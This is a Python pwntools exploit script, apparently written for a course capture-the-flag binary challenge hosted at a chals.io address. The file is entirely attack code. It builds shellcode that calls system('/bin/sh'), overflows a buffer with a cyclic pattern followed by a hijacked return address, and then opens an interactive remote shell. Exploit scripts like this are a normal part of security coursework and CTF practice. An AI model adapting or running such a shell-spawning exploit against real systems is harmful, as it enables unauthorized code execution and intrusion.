from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin5.chals.io", 443, ssl=True, sni="cse4850-bin5.chals.io")
    return process(e.path)

bin_sh = b'/bin/sh\0'
shell = asm(f"""
    pop rax
    mov rax, {u64(bin_sh)}
    push rax
    mov rdi, rsp
    mov rax, {e.plt['system']}
    jmp rax
""")

if len(shell) > 0x24:
    log.error(f"ERROR! Shell is too long with length: {len(shell)}")

p = start()
p.sendlineafter(b'>>>', shell)
p.sendlineafter(b'>>>', b'a')

payload = cyclic(32)
payload += p64(0xca110000)
p.sendlineafter(b'>>>', payload)

p.interactive()